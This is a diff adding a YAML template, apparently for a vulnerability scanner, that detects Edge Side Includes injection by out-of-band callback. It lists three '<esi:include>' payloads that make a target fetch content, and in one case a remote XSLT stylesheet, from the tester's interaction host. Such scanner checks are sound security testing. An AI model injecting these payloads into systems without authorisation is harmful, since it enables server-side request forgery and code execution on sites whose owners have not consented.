@@ -1,0 +1,20 @@
+id: "esi_injection"
+issue_code: "esi_injection"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 100
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: filename
+    value: "{{randomString 4}}"
+templates:
+  - <esi:include src={{.oob_address}}/>
+  - <esi:include src="{{.oob_address}}"/>
+  - <esi:include src="https://{{.oob_address}}/{{.filename}}.xml" dca="xslt" stylesheet="https://{{.oob_address}}/{{.filename}}.xsl" />
+categories:
+  - oob
+platforms:
+  - esi
